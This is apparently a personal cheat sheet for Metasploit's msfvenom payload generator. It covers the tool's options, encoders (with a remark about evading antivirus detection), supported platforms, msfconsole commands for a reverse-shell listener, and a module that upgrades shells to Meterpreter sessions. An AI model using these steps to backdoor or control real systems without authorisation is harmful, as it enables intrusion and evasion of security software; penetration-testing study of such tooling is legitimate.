Links:
1.http://www.drchaos.com/the-art-of-creating-backdoors-and-exploits-with-metasploit/
2.https://www.youtube.com/watch?v=Y5_-OW1OQPQ
3.http://www.hackingarticles.in/command-shell-to-meterpreter/

Basic Help MsfVenom
{
	MsfVenom - a Metasploit standalone payload generator.
	Also a replacement for msfpayload and msfencode.
	Usage: /usr/bin/msfvenom [options] <var=val>

	Options:
	    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
		--payload-options            List the payload's standard options
	    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
	    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
	    -f, --format        <format>     Output format (use --help-formats for a list)
		--help-formats               List available formats
	    -e, --encoder       <encoder>    The encoder to use
	    -a, --arch          <arch>       The architecture to use
		--platform      <platform>   The platform of the payload
		--help-platforms             List available platforms
	    -s, --space         <length>     The maximum size of the resulting payload
		--encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
	    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
	    -i, --iterations    <count>      The number of times to encode the payload
	    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
	    -x, --template      <path>       Specify a custom executable file to use as a template
	    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
	    -o, --out           <path>       Save the payload
	    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
		--smallest                   Generate the smallest possible payload
	    -h, --help                       Show this message
}

Encoders
{
	x86/call4_dword_xor – This encoder implements a Call+4 Dword XOR Encoder

	x86/countdown – This encoder uses the length of the payload as a position-dependent encoder key to produce a small decoder stub.

	x86/fnstenv_mov – This encoder uses a variable-length mov equivalent instruction with fnstenv for getip.

	x86/jmp_call_additive – This encoder implements a Jump/Call XOR Additive Feedback Encoder

	x86/shikata_ga_nai – This encoder implements a Polymorphic XOR Additive Feedback Encoder. 
			     The decoder stub is generated based on dynamic instruction substitution and dynamic block ordering. 
			     Registers are also selected dynamically.

	Most people claim shikata_ga_nai is the best encoder, however, I find many AV companies make great effort to detect this encoder. 
}

Platforms
{
   #Here is a list of available platforms one can enter when using the –platform switch. 

	Cisco or cisco 
	OSX or osx 
	Solaris or solaris 
	BSD or bsd 
	OpenBSD or openbsd 
	Firefox or firefox 
	BSDi or bsdi 
	NetBSD or netbsd 
	NodeJS or nodejs 
	FreeBSD or freebsd 
	Python or python 
	AIX or aix 
	JavaScript or javascript 
	HPUX or hpux 
	PHP or php 
	Irix or irix 
	Unix or unix 
	Linux or linux 
	Ruby or ruby 
	Java or java 
	Android or android 
	Netware or netware 
	Windows or windows
}


======  Start Listener  =====

=>open msfconsole  ,then type

use multi/handler
#Specify payload to use
set payload windows/shell/blahblah
#Specify IP & Port
set LHOST ip.ip.ip.ip
set LPORT portNum
set EXITONSESSIONS false
#Start exploit !
exploit -j      
#-j options auto-backgrounds the acquired sessions


====== Escalate Privilegs to get Meterpreter Session =====

#You need to have acquired a session for this to work
use post/multi/manage/shell_to_meterpreter
set session 1               #replace 1 by session number
exploit

#Now check using sessions command if the session has been escalated, else access the session and hit enter few times until you get
meterpreter session.



======= Extras For Use ========
1.See Reverse Sessions
sesions -v

2.Open session (for use)
sessions -i numberOfSession

3.Background The Session
Ctrl+Z

4.End The Session
Ctrl+C

5.Exit Module
Ctrl+C

